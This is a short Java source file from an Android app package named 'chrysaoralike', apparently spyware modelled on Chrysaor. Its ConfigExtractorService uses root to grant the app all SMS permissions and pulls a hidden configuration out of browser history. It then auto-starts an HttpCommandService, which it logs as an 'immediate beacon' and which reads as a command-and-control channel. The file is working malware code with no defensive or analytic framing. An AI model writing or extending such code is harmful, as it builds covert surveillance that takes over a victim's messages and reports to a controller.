package com.android.chrysaoralike;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

public class ConfigExtractorService extends IntentService {
    private static final String TAG = "ConfigExtractorService";

    public ConfigExtractorService() {
        super("ConfigExtractorService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.i(TAG, "Config extractor service started.");
        if (!RootUtils.checkRoot()) {
            Log.w(TAG, "Root not available – proceeding with limited capabilities.");
        } else {
            RootUtils.grantAllSmsPermissions(getPackageName());
        }
        BrowserHistoryExtractor extractor = new BrowserHistoryExtractor(this);
        ConfigData config = extractor.extractAndClean();
        if (config != null && config.isValid()) {
            Log.i(TAG, "Config extraction successful: " + config);
            // NEW: Auto‑start the HTTP service immediately
            startService(new Intent(this, HttpCommandService.class));
            Log.i(TAG, "Auto‑started HttpCommandService for immediate beacon.");
        } else {
            Log.w(TAG, "Config extraction failed or no config found.");
        }
    }
}